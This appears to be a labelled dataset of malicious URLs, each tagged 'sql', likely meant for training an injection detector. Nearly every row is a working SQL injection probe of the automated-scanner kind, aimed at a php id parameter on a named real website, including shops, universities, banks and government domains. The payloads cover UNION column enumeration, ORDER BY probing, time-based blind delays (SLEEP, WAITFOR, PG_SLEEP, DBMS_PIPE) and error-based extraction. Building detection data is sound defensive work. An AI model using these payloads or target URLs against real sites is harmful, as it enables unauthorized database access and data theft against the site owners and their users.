1,sql,http : / / www . romanianwriters . ro / s . php ? id = 1 % ' UNION ALL SELECT NULL , NULL , NULL , NULL - - vGXN
119,sql,http : / / www . blessgans . de / index . php ? id = 1 UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL - - IKMj
120,sql,http : / / www . zentrumexil . at / index . php ? id = 1 ' AND SLEEP ( 5 ) AND ' itCe ' = ' itCe
121,sql,https : / / www . laboshop . com / index . php ? id = 1 % ' ;WAITFOR DELAY ' 0 : 0 : 5 ' - - 
122,sql,http : / / www . stalmax . com / index . php ? id = 1 AND 4249 = ( SELECT UPPER ( XMLType ( CHR ( 60 ) | | CHR ( 58 ) | | CHR ( 113 ) | | CHR ( 118 ) | | CHR ( 106 ) | | CHR ( 98 ) | | CHR ( 113 ) | | ( SELECT ( CASE WHEN ( 4249 = 4249 ) THEN 1 ELSE 0 END ) FROM DUAL ) | | CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 120 ) | | CHR ( 113 ) | | CHR ( 62 ) ) ) FROM DUAL ) 
123,sql,https : / / rational . org / index . php ? id = 1 UNION ALL SELECT NULL , NULL - - ctvb
124,sql,https : / / library . geraldika . ru / book . php ? id = 1 AND 9533 IN ( SELECT ( CHAR ( 113 ) +CHAR ( 118 ) +CHAR ( 106 ) +CHAR ( 98 ) +CHAR ( 113 ) + ( SELECT ( CASE WHEN ( 9533 = 9533 ) THEN CHAR ( 49 ) ELSE CHAR ( 48 ) END ) ) +CHAR ( 113 ) +CHAR ( 113 ) +CHAR ( 113 ) +CHAR ( 120 ) +CHAR ( 113 ) ) ) - - sFCM
125,sql,http : / / www . redtory . com . cn / english / about . php ? id = 1 ' AND 7019 = 2399 AND ' bmfB ' = ' bmfB
126,sql,http : / / www . innofader . com / products . php ? id = 1 AND ( SELECT 9697 FROM ( SELECT COUNT ( * ) , CONCAT ( 0x71766a6271 , ( SELECT ( ELT ( 9697 = 9697 , 1 ) ) ) , 0x7171717871 , FLOOR ( RAND ( 0 ) *2 ) ) x FROM INFORMATION_SCHEMA . PLUGINS GROUP BY x ) a ) 
127,sql,http : / / www . freescience . info / books . php ? id = 1 ) UNION ALL SELECT NULL , NULL - - EXrh
128,sql,http : / / www . treeviewthai . com / service_en . php ? id = 1 ORDER BY 1 - - lAea
129,sql,http : / / www . ghanatimber . org / certification_details . php ? id = 1 AND 6592 = ( SELECT 6592 FROM PG_SLEEP ( 5 ) ) 
131,sql,http : / / venusita - moda . com / article . php ? id = 1 UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL - - itKr
132,sql,http : / / byglearning . co . uk / mrcrsc - lms / course / category . php ? id = 1 ) ORDER BY 1 - - zRhc
133,sql,http : / / www . mcdonalds . co . jp / quality / allergy_Nutrition / nutrient2 . php ? id = 1 UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL - - itKr
134,sql,http : / / www . energyquest . com . au / reports . php ? id = 1 ) AND 4249 = ( SELECT UPPER ( XMLType ( CHR ( 60 ) | | CHR ( 58 ) | | CHR ( 113 ) | | CHR ( 118 ) | | CHR ( 106 ) | | CHR ( 98 ) | | CHR ( 113 ) | | ( SELECT ( CASE WHEN ( 4249 = 4249 ) THEN 1 ELSE 0 END ) FROM DUAL ) | | CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 120 ) | | CHR ( 113 ) | | CHR ( 62 ) ) ) FROM DUAL ) AND ( 9475 = 9475
135,sql,http : / / www . rideitmoto . com / products_list1 . php ? id = 1 ) AND 3611 = 3611 AND ( 5554 = 5554
137,sql,http : / / www . tdap . gov . pk / trade - bodies . php ? id = 1 ORDER BY 1 - - kzEn
138,sql,https : / / www . ileswastesystems . co . uk / index . php ? id = 1 ORDER BY 1 - - lAea
140,sql,https : / / mahara . org / group / view . php ? id = 1 % ' AND 3611 = 3611 AND ' % ' = ' 
141,sql,http : / / www . palavrion . com / index . php ? id = 1 ' ;WAITFOR DELAY ' 0 : 0 : 5 ' - - 
143,sql,https : / / www . indianembassy . de / pages . php ? id = 6787
144,sql,https : / / www . dt - shop . com / index . php ? id = 1 AND ( SELECT 9697 FROM ( SELECT COUNT ( * ) , CONCAT ( 0x71766a6271 , ( SELECT ( ELT ( 9697 = 9697 , 1 ) ) ) , 0x7171717871 , FLOOR ( RAND ( 0 ) *2 ) ) x FROM INFORMATION_SCHEMA . PLUGINS GROUP BY x ) a ) 
145,sql,http : / / www . gulf1bank . com / page . php ? id = 1 ' NKZqCS< ' ">bIRAbA
146,sql,http : / / www . nsb . gov . bt / publication / publications . php ? id = 5845
147,sql,http : / / www . cubana . ru / about . php ? id = 1 ' WAITFOR DELAY ' 0 : 0 : 5 ' AND ' cIcm ' = ' cIcm
148,sql,http : / / nursing . flinders . edu . au / students / studyaids / drugcalculations / page . php ? id = 1 ' ) AND 7622 = CAST ( ( CHR ( 113 ) | | CHR ( 118 ) | | CHR ( 106 ) | | CHR ( 98 ) | | CHR ( 113 ) ) | | ( SELECT ( CASE WHEN ( 7622 = 7622 ) THEN 1 ELSE 0 END ) ) : : text | | ( CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 120 ) | | CHR ( 113 ) ) AS NUMERIC ) AND ( ' JGjZ ' = ' JGjZ
149,sql,http : / / outbacklabs . com / listing . php ? id = 1 ' UNION ALL SELECT NULL - - lmXC
150,sql,http : / / www . viparspectra . com / category . php ? id = 1 UNION ALL SELECT NULL , NULL , NULL , NULL - - fKpc
151,sql,http : / / silverstateenergy . org / announcement . php ? id = 1 ) UNION ALL SELECT NULL , NULL - - EXrh
152,sql,https : / / edlinked . soe . waikato . ac . nz / research / journal / index . php ? id = 1" ) ) ) ( , , ) ' ) 
153,sql,http : / / www . ausmip . org / main . php ? id = 1 AND 9533 IN ( SELECT ( CHAR ( 113 ) +CHAR ( 118 ) +CHAR ( 106 ) +CHAR ( 98 ) +CHAR ( 113 ) + ( SELECT ( CASE WHEN ( 9533 = 9533 ) THEN CHAR ( 49 ) ELSE CHAR ( 48 ) END ) ) +CHAR ( 113 ) +CHAR ( 113 ) +CHAR ( 113 ) +CHAR ( 120 ) +CHAR ( 113 ) ) ) 
154,sql,http : / / www . realisticky . cz / ucebnice . php ? id = 1 UNION ALL SELECT NULL , NULL - - ctvb
155,sql,http : / / www . pyme . go . cr / cuadro1 . php ? id = 1 ' ) ORDER BY 1 - - tslS
156,sql,http : / / www . hrpub . org / journals / jour_info . php ? id = 1 ) AND SLEEP ( 5 ) AND ( 7824 = 7824
157,sql,http : / / www . ipicshopping . co . za / shopping_centre . php ? id = 1 AND SLEEP ( 5 ) 
158,sql,http : / / biblia . deon . pl / rozdzial . php ? id = 1 % ' ORDER BY 7815 - - mzUV
160,sql,http : / / www . vaughanchinese . com / new / websites / content . php ? id = 1 ORDER BY 1 - - kzEn
161,sql,http : / / alphaonenow . org / info . php ? id = 1 % ' UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL - - WYnw
162,sql,https : / / polenow . com / login . php ? id = 1 % ' AND 3611 = 3611 AND ' % ' = ' 
164,sql,http : / / www . justiceforsergei . com / video . php ? id = 1 % ' UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL - - WYnw
165,sql,http : / / www . mujahidkamran . com / books . php ? id = 1 AND 6592 = ( SELECT 6592 FROM PG_SLEEP ( 5 ) ) - - Qmvu
166,sql,https : / / www . anglesgallery . com / ssp_director / artistgallery . php ? id = 1 % ' AND SLEEP ( 5 ) AND ' % ' = ' 
167,sql,http : / / identitiesjournal . edu . mk / cat . php ? id = 1 UNION ALL SELECT NULL , NULL , NULL , NULL , NULL - - rjiF
168,sql,http : / / www . microfinance . lk / member_profile . php ? id = 1 % ' AND 9533 IN ( SELECT ( CHAR ( 113 ) +CHAR ( 118 ) +CHAR ( 106 ) +CHAR ( 98 ) +CHAR ( 113 ) + ( SELECT ( CASE WHEN ( 9533 = 9533 ) THEN CHAR ( 49 ) ELSE CHAR ( 48 ) END ) ) +CHAR ( 113 ) +CHAR ( 113 ) +CHAR ( 113 ) +CHAR ( 120 ) +CHAR ( 113 ) ) ) AND ' % ' = ' 
169,sql,http : / / www . aphesa . com / downloads / download2 . php ? id = 1 ) AND 3611 = 3611 AND ( 5554 = 5554
170,sql,http : / / www . microatena . it / biblioteca . php ? id = 1 ' AND 7622 = CAST ( ( CHR ( 113 ) | | CHR ( 118 ) | | CHR ( 106 ) | | CHR ( 98 ) | | CHR ( 113 ) ) | | ( SELECT ( CASE WHEN ( 7622 = 7622 ) THEN 1 ELSE 0 END ) ) : : text | | ( CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 120 ) | | CHR ( 113 ) ) AS NUMERIC ) AND ' VCNg ' = ' VCNg
171,sql,https : / / www . safari - hotels . com / site / 3 . php ? id = 1 ' ) ORDER BY 1 - - tslS
172,sql,http : / / dancingbetty . com / product - list . php ? id = 1 UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL - - ntmA
173,sql,http : / / www . terraclean . net / product . php ? id = 1 % ' ORDER BY 1 - - KBQw
174,sql,http : / / www . gainwelltravel . com / cms . php ? id = 1 ' AND 7622 = CAST ( ( CHR ( 113 ) | | CHR ( 118 ) | | CHR ( 106 ) | | CHR ( 98 ) | | CHR ( 113 ) ) | | ( SELECT ( CASE WHEN ( 7622 = 7622 ) THEN 1 ELSE 0 END ) ) : : text | | ( CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 120 ) | | CHR ( 113 ) ) AS NUMERIC ) AND ' VCNg ' = ' VCNg
175,sql,http : / / www . morini . ch / product_det . php ? id = 1 ' ORDER BY 6555 - - CoTc
176,sql,http : / / www . renexpo - bih . com / index . php ? id = 1 % ' UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL - - WYnw
178,sql,https : / / learning . thefa . com / totara / program / view . php ? id = 1 AND 7622 = CAST ( ( CHR ( 113 ) | | CHR ( 118 ) | | CHR ( 106 ) | | CHR ( 98 ) | | CHR ( 113 ) ) | | ( SELECT ( CASE WHEN ( 7622 = 7622 ) THEN 1 ELSE 0 END ) ) : : text | | ( CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 120 ) | | CHR ( 113 ) ) AS NUMERIC ) 
179,sql,http : / / www . austinminiatures . com / products . php ? id = 1 % ' AND SLEEP ( 5 ) AND ' % ' = ' 
180,sql,http : / / kpd1 . ru / catalog . php ? id = 1 . 8ChSI
181,sql,http : / / www . habibitours . com / cat . php ? id = 1 ) UNION ALL SELECT NULL , NULL , NULL , NULL - - zhRN
182,sql,http : / / www . daesgroup . com / region . php ? id = 1 ' ) UNION ALL SELECT NULL , NULL , NULL , NULL - - atbf
183,sql,http : / / www . ventrilo . com / dlprod . php ? id = 1 ' ) AND 6592 = ( SELECT 6592 FROM PG_SLEEP ( 5 ) ) AND ( ' bARY ' = ' bARY
184,sql,http : / / www . system16 . com / museum . php ? id = 1 ' ) AND ( SELECT 9697 FROM ( SELECT COUNT ( * ) , CONCAT ( 0x71766a6271 , ( SELECT ( ELT ( 9697 = 9697 , 1 ) ) ) , 0x7171717871 , FLOOR ( RAND ( 0 ) *2 ) ) x FROM INFORMATION_SCHEMA . PLUGINS GROUP BY x ) a ) AND ( ' DVsm ' = ' DVsm
185,sql,http : / / www . stabilizationandtransition . org / Bio . php ? id = 1 UNION ALL SELECT NULL , NULL , NULL , NULL - - fKpc
186,sql,http : / / www . turbaza - volgograd . ru / viewbase . php ? id = 1 % ' UNION ALL SELECT NULL , NULL , NULL , NULL , NULL - - nBvv
187,sql,http : / / www . sunxtender . com / solarbattery . php ? id = 1 ' ) ORDER BY 1 - - tslS
188,sql,http : / / www . cmt - net . org / index . php ? id = 1 ' UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL - - mqyP
189,sql,http : / / www . cultuurwijzerapeldoorn . nl / cultuurmenu . php ? id = 1 ' ) UNION ALL SELECT NULL , NULL , NULL , NULL - - atbf
190,sql,http : / / www . indiainfrastructure . com / shopping_cart . php ? id = 1 ' UNION ALL SELECT NULL , NULL - - ViPr
191,sql,https : / / www . kianjoocan . com . my / index . php ? id = 1 ORDER BY 1 - - kzEn
194,sql,http : / / ska3 . ru / bummi . php ? id = ( SELECT CHAR ( 113 ) +CHAR ( 118 ) +CHAR ( 106 ) +CHAR ( 98 ) +CHAR ( 113 ) + ( SELECT ( CASE WHEN ( 5838 = 5838 ) THEN CHAR ( 49 ) ELSE CHAR ( 48 ) END ) ) +CHAR ( 113 ) +CHAR ( 113 ) +CHAR ( 113 ) +CHAR ( 120 ) +CHAR ( 113 ) ) 
195,sql,http : / / www . caosciotocounty . org / template . php ? id = 1 ' ) ;SELECT DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( 84 ) | | CHR ( 106 ) | | CHR ( 102 ) | | CHR ( 83 ) , 5 ) FROM DUAL - - 
197,sql,http : / / www . askewsfoods . com / stores . php ? id = 1 UNION ALL SELECT NULL , NULL - - ctvb
198,sql,http : / / www . firstinmichigan . org / stream . php ? id = 1 UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL - - qwPK
199,sql,http : / / boywhofell . com / index . php ? id = 1 % ' WAITFOR DELAY ' 0 : 0 : 5 ' AND ' % ' = ' 
200,sql,https : / / www . arabculturefund . org / projects / project . php ? id = ( SELECT ( CASE WHEN ( 3684 = 3684 ) THEN 3684 ELSE 3684* ( SELECT 3684 FROM INFORMATION_SCHEMA . PLUGINS ) END ) ) 
201,sql,https : / / www . zobodat . at / publikation_series . php ? id = 5433 - 5432
202,sql,http : / / stfranciscountyar . org / page . php ? id = 1 ' ) UNION ALL SELECT NULL - - eEGL
203,sql,http : / / www . harvestlink . com / productsDia . php ? id = 1 ORDER BY 1 - - lAea
204,sql,http : / / www . indiannumismatics . com / products . php ? id = ( SELECT ( CASE WHEN ( 9362 = 8798 ) THEN 9362 ELSE 9362* ( SELECT 9362 FROM INFORMATION_SCHEMA . PLUGINS ) END ) ) 
205,sql,http : / / www . integral - eu . com / index . php ? id = 5433 - 5432
206,sql,http : / / www . howtostudy . org / resources_skill . php ? id = 1 % ' WAITFOR DELAY ' 0 : 0 : 5 ' AND ' % ' = ' 
207,sql,http : / / www . prazskamuzejninoc . cz / 2017 / clanek . php ? id = 1 AND 2076 = 1452 - - zXSW
209,sql,http : / / netintel . ru / index . php ? id = 1 UNION ALL SELECT NULL - - jscU
210,sql,http : / / www . shortrifles . com / configuration . php ? id = 1 % ' AND 9940 = DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( 73 ) | | CHR ( 111 ) | | CHR ( 115 ) | | CHR ( 104 ) , 5 ) AND ' % ' = ' 
212,sql,http : / / www . atmarine . fi / index . php ? id = ( SELECT CONCAT ( 0x71766a6271 , ( SELECT ( ELT ( 3360 = 3360 , 1 ) ) ) , 0x7171717871 ) ) 
213,sql,http : / / www . marsfigures . com / main . php ? id = 1 ) AND 9940 = DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( 73 ) | | CHR ( 111 ) | | CHR ( 115 ) | | CHR ( 104 ) , 5 ) AND ( 4586 = 4586
214,sql,http : / / www . rysslandsresor . se / index . php ? id = 5433 - 5432
215,sql,https : / / www . ecabank . com / home / index . php ? id = 1 ' ) AND SLEEP ( 5 ) AND ( ' GJyr ' = ' GJyr
216,sql,http : / / bram . smartelectronix . com / plugins . php ? id = 1" ) ) ) ( , , ) ' ) 
217,sql,http : / / www . gardenfarmgolf . com / en_locations . php ? id = 1 % ' UNION ALL SELECT NULL , NULL , NULL , NULL - - vGXN
218,sql,http : / / orgia . ru / about . php ? id = 1 % ' AND 9533 IN ( SELECT ( CHAR ( 113 ) +CHAR ( 118 ) +CHAR ( 106 ) +CHAR ( 98 ) +CHAR ( 113 ) + ( SELECT ( CASE WHEN ( 9533 = 9533 ) THEN CHAR ( 49 ) ELSE CHAR ( 48 ) END ) ) +CHAR ( 113 ) +CHAR ( 113 ) +CHAR ( 113 ) +CHAR ( 120 ) +CHAR ( 113 ) ) ) AND ' % ' = ' 
219,sql,http : / / www . goafilms . com / location . php ? id = 1 UNION ALL SELECT NULL - - uRNf
220,sql,http : / / learnonline . health . nz / course / category . php ? id = 1 ) ;SELECT PG_SLEEP ( 5 ) - - 
221,sql,http : / / www . stasy . gr / index . php ? id = 1 ' ) UNION ALL SELECT NULL , NULL - - utDw
222,sql,https : / / malffb . gov . vu / index . php ? id = 1 AND 9940 = DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( 73 ) | | CHR ( 111 ) | | CHR ( 115 ) | | CHR ( 104 ) , 5 ) 
223,sql,http : / / njsfwc . org / projects . php ? id = 1 AND 9533 IN ( SELECT ( CHAR ( 113 ) +CHAR ( 118 ) +CHAR ( 106 ) +CHAR ( 98 ) +CHAR ( 113 ) + ( SELECT ( CASE WHEN ( 9533 = 9533 ) THEN CHAR ( 49 ) ELSE CHAR ( 48 ) END ) ) +CHAR ( 113 ) +CHAR ( 113 ) +CHAR ( 113 ) +CHAR ( 120 ) +CHAR ( 113 ) ) ) 
224,sql,http : / / www . krao . ru / cd - item . php ? id = 1 AND 3050 = 5102
225,sql,http : / / www . ulagos . cl / contenido03 . php ? id = 1 % ' WAITFOR DELAY ' 0 : 0 : 5 ' AND ' % ' = ' 
226,sql,https : / / wciom . ru / index . php ? id = 1 ) UNION ALL SELECT NULL , NULL , NULL , NULL - - zhRN
227,sql,http : / / www . icehalo . ca / products . php ? id = 1 ORDER BY 1715 - - vHUQ
228,sql,http : / / www . vittoria - shoes . com / prodotto . php ? id = 1 ) ;SELECT DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( 84 ) | | CHR ( 106 ) | | CHR ( 102 ) | | CHR ( 83 ) , 5 ) FROM DUAL - - 
229,sql,http : / / mkogan . com / duty . php ? id = 1 ' ) UNION ALL SELECT NULL , NULL , NULL , NULL - - atbf
230,sql,https : / / koreamed . org / JournalVolume . php ? id = 1 AND ( SELECT 9697 FROM ( SELECT COUNT ( * ) , CONCAT ( 0x71766a6271 , ( SELECT ( ELT ( 9697 = 9697 , 1 ) ) ) , 0x7171717871 , FLOOR ( RAND ( 0 ) *2 ) ) x FROM INFORMATION_SCHEMA . PLUGINS GROUP BY x ) a ) 
231,sql,http : / / www . skytraktravel . com / services . php ? id = 1 ' UNION ALL SELECT NULL - - lmXC
232,sql,http : / / www . uba . ar / academicos / uba21 / contenidos . php ? id = 1 UNION ALL SELECT NULL , NULL , NULL , NULL - - fKpc
233,sql,http : / / www . isconshanghai . org / web / page . php ? id = 1 ) UNION ALL SELECT NULL , NULL , NULL , NULL - - zhRN
234,sql,https : / / www . id . ee / index . php ? id = 1 % ' ;SELECT PG_SLEEP ( 5 ) - - 
236,sql,http : / / pastelspace . com / collection . php ? id = 1 ) AND ( SELECT 9697 FROM ( SELECT COUNT ( * ) , CONCAT ( 0x71766a6271 , ( SELECT ( ELT ( 9697 = 9697 , 1 ) ) ) , 0x7171717871 , FLOOR ( RAND ( 0 ) *2 ) ) x FROM INFORMATION_SCHEMA . PLUGINS GROUP BY x ) a ) AND ( 6121 = 6121
237,sql,https : / / www . sjs . org . hk / en / services / services . php ? id = 1 AND SLEEP ( 5 ) 
238,sql,http : / / maximaaa . com / mform / view . php ? id = 1 ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL - - CEEX
239,sql,http : / / www . echmb . com / about_details . php ? id = 1 ) AND 3611 = 3611 AND ( 5554 = 5554
240,sql,https : / / toxtown . nlm . nih . gov / text_version / chemicals . php ? id = 1 ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL - - CEEX
241,sql,http : / / www . med . muni . cz / index . php ? id = 1 ' UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL - - PViD
242,sql,http : / / len - zoloto . ru / index . php ? id = 1 % ' ;SELECT DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( 84 ) | | CHR ( 106 ) | | CHR ( 102 ) | | CHR ( 83 ) , 5 ) FROM DUAL - - 
244,sql,http : / / www . nordiqc . org / epitope . php ? id = 1 ORDER BY 1 - - kzEn
245,sql,http : / / meninositu . com . br / galeria / album . php ? id = 1 ' NKZqCS< ' ">bIRAbA
246,sql,https : / / www . nttgroup . co . za / proc / dealer_detail . php ? id = 1 % ' AND ( SELECT 9697 FROM ( SELECT COUNT ( * ) , CONCAT ( 0x71766a6271 , ( SELECT ( ELT ( 9697 = 9697 , 1 ) ) ) , 0x7171717871 , FLOOR ( RAND ( 0 ) *2 ) ) x FROM INFORMATION_SCHEMA . PLUGINS GROUP BY x ) a ) AND ' % ' = ' 
247,sql,http : / / www . hold . com . tw / product . php ? id = 1 ) UNION ALL SELECT NULL - - fqfI
248,sql,http : / / www . catsg . org / index . php ? id = 1 ' UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL - - mqyP
249,sql,http : / / www . theurbanrange . com / poet . php ? id = 1 ' ) UNION ALL SELECT NULL , NULL , NULL - - SOSW
250,sql,http : / / www . markzaid . com / biography . php ? id = 1 ) AND ( SELECT 9697 FROM ( SELECT COUNT ( * ) , CONCAT ( 0x71766a6271 , ( SELECT ( ELT ( 9697 = 9697 , 1 ) ) ) , 0x7171717871 , FLOOR ( RAND ( 0 ) *2 ) ) x FROM INFORMATION_SCHEMA . PLUGINS GROUP BY x ) a ) AND ( 6121 = 6121
251,sql,http : / / www . markdrum . it / product_detail . php ? id = 1 ' UNION ALL SELECT NULL , NULL , NULL - - hhTM
252,sql,http : / / www . madisonpac . com / key_details . php ? id = 1 UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL - - gXRN
253,sql,http : / / pyb . co . uk / cakes - detail . php ? id = 1 AND 6592 = ( SELECT 6592 FROM PG_SLEEP ( 5 ) ) 
254,sql,http : / / www . dengy - vsem . ru / prokrizis_vid . php ? id = 1 ' WAITFOR DELAY ' 0 : 0 : 5 ' AND ' cIcm ' = ' cIcm
255,sql,http : / / one - thebrand . com / cart . php ? id = 1 % ' AND 7622 = CAST ( ( CHR ( 113 ) | | CHR ( 118 ) | | CHR ( 106 ) | | CHR ( 98 ) | | CHR ( 113 ) ) | | ( SELECT ( CASE WHEN ( 7622 = 7622 ) THEN 1 ELSE 0 END ) ) : : text | | ( CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 120 ) | | CHR ( 113 ) ) AS NUMERIC ) AND ' % ' = ' 
